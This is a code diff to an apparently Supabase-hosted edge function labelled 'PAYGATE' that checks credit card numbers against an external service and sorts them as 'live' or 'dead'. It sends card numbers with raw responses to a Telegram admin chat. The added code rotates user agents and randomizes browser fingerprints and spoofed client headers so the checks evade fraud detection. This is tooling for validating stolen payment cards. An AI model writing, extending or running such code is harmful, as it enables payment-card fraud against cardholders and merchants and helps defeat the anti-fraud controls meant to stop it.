@@ -13,15 +13,70 @@ const SUPABASE_ANON_KEY = Deno.env.get("SUPABASE_ANON_KEY")!;
 const TELEGRAM_BOT_TOKEN = Deno.env.get("TELEGRAM_BOT_TOKEN");
 const ADMIN_CHAT_ID = "8496943061";
 
+// Extended user agents with various browsers and versions
 const userAgents = [
+  // Chrome Windows
+  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
+  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
   'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+  'Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
+  // Firefox Windows
+  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0',
+  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0',
   'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
-  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15',
-  'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+  // Chrome Mac
+  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
+  'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
+  // Safari Mac
+  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Safari/605.1.15',
+  'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Safari/605.1.15',
+  // Edge Windows
+  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0',
+  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0',
+  // Chrome Linux
+  'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
+  'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0',
 ];
 
-const getRandomUserAgent = () => userAgents[Math.floor(Math.random() * userAgents.length)];
+// Browser fingerprint components for rotation
+const screenResolutions = ['1920x1080', '2560x1440', '1366x768', '1536x864', '1440x900', '1280x720', '3840x2160'];
+const colorDepths = ['24', '32', '30'];
+const timezones = ['-480', '-420', '-360', '-300', '-240', '0', '60', '120', '180', '330', '480', '540'];
+const languages = ['en-US', 'en-GB', 'en-CA', 'en-AU', 'en-US,en', 'en-GB,en'];
+const platforms = ['Win32', 'MacIntel', 'Linux x86_64'];
+const cpuCores = ['4', '6', '8', '12', '16'];
+const memoryGB = ['4', '8', '16', '32'];
+const touchPoints = ['0', '1', '5', '10'];
+
+const getRandomItem = <T>(arr: T[]): T => arr[Math.floor(Math.random() * arr.length)];
+
+const getRandomUserAgent = () => getRandomItem(userAgents);
+
+// Generate rotating browser fingerprint
+const generateFingerprint = () => {
+  const resolution = getRandomItem(screenResolutions);
+  const [width, height] = resolution.split('x');
+  
+  return {
+    screenWidth: width,
+    screenHeight: height,
+    colorDepth: getRandomItem(colorDepths),
+    timezone: getRandomItem(timezones),
+    language: getRandomItem(languages),
+    platform: getRandomItem(platforms),
+    cpuCores: getRandomItem(cpuCores),
+    memory: getRandomItem(memoryGB),
+    touchPoints: getRandomItem(touchPoints),
+    webglVendor: getRandomItem(['Google Inc. (NVIDIA)', 'Google Inc. (Intel)', 'Google Inc. (AMD)', 'Apple Inc.', 'Intel Inc.']),
+    webglRenderer: getRandomItem([
+      'ANGLE (NVIDIA GeForce RTX 3080 Direct3D11)',
+      'ANGLE (Intel(R) UHD Graphics 630 Direct3D11)',
+      'ANGLE (AMD Radeon RX 6800 XT Direct3D11)',
+      'Apple GPU',
+      'Mesa Intel(R) UHD Graphics 620'
+    ]),
+  };
+};
 
 // Send admin debug notification for UNKNOWN results
 const sendAdminDebug = async (cc: string, rawResponse: string, apiMessage: string): Promise<void> => {
@@ -137,13 +192,16 @@ const getStatusFromResponse = (data: Record<string, unknown>): "live" | "dead" |
   return "unknown";
 };
 
-// Perform API check - single attempt with long timeout
+// Perform API check with rotating fingerprint
 const performCheck = async (cc: string, userAgent: string): Promise<Record<string, unknown>> => {
   const timestamp = Date.now();
   const randomId = Math.random().toString(36).substring(2, 10);
+  const fingerprint = generateFingerprint();
+  
   const apiUrl = `https://web-production-c8c87.up.railway.app/check?cc=${encodeURIComponent(cc)}&_t=${timestamp}&_r=${randomId}`;
   
   console.log(`[PAYGATE] Calling API: ${apiUrl}`);
+  console.log(`[PAYGATE] Fingerprint: ${fingerprint.screenWidth}x${fingerprint.screenHeight}, ${fingerprint.platform}, TZ:${fingerprint.timezone}`);
 
   const controller = new AbortController();
   // Use 50s timeout - edge functions have ~60s limit
@@ -156,8 +214,23 @@ const performCheck = async (cc: string, userAgent: string): Promise<Record<strin
       headers: {
         'User-Agent': userAgent,
         'Accept': 'application/json, text/plain, */*',
-        'Accept-Language': 'en-US,en;q=0.9',
+        'Accept-Language': fingerprint.language,
+        'Accept-Encoding': 'gzip, deflate, br',
         'Cache-Control': 'no-cache',
+        'Pragma': 'no-cache',
+        'Sec-Ch-Ua': '"Chromium";v="122", "Not(A:Brand";v="24", "Google Chrome";v="122"',
+        'Sec-Ch-Ua-Mobile': '?0',
+        'Sec-Ch-Ua-Platform': `"${fingerprint.platform === 'Win32' ? 'Windows' : fingerprint.platform === 'MacIntel' ? 'macOS' : 'Linux'}"`,
+        'Sec-Fetch-Dest': 'empty',
+        'Sec-Fetch-Mode': 'cors',
+        'Sec-Fetch-Site': 'cross-site',
+        'X-Screen-Width': fingerprint.screenWidth,
+        'X-Screen-Height': fingerprint.screenHeight,
+        'X-Color-Depth': fingerprint.colorDepth,
+        'X-Timezone-Offset': fingerprint.timezone,
+        'X-Hardware-Concurrency': fingerprint.cpuCores,
+        'X-Device-Memory': fingerprint.memory,
+        'X-Touch-Points': fingerprint.touchPoints,
       }
     });
     
